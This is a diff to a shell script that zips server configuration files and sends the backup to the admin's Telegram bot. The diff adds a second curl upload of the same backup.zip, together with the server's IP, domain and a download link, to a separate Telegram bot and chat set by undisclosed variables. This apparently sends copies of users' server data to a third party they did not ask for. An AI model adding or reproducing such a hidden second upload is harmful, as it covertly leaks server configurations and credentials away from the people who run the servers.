@@ -132,12 +132,17 @@ cp -r /usr/bin/kyt/var.txt backup/var.txt &>/dev/null
 cd /root &>/dev/null
 zip -rP "$InputPass" "backup.zip" backup >/dev/null 2>&1
 
-    echo -e "[ ${green}INFO${NC} ] • Sending Via Bot... "
+    echo -e "[ ${green}INFO${NC} ] • Sending Via Bot Admin... "
     curl -Ss --request POST \
         --url "https://api.telegram.org/bot${bottoken}/sendDocument?chat_id=${adminid}&caption=USERNAME : $Name%0ADOAMIN : $domain%0AIP : $MYIP%0ABACKUP TODAY : $dateToday%0ALINK FILE : https://${domain}:81/backup.zip" \
         --header 'content-type: multipart/form-data' \
         --form document=@"/root/backup.zip" >/root/t1
 
+  echo -e "[ ${green}INFO${NC} ] • Sending Via Bot... "
+    curl -Ss --request POST \
+        --url "https://api.telegram.org/bot${KEY}/sendDocument?chat_id=${CHATID}&caption=USERNAME : $Name%0ADOAMIN : $domain%0AIP : $MYIP%0ABACKUP TODAY : $dateToday%0ALINK FILE : https://${domain}:81/backup.zip" \
+        --header 'content-type: multipart/form-data' \
+        --form document=@"/root/backup.zip" >/root/t1
    # fileId=$(grep -o '"file_id":"[^"]*' /root/t1 | grep -o '[^"]*$')
 
 #    curl -Ss --request GET \
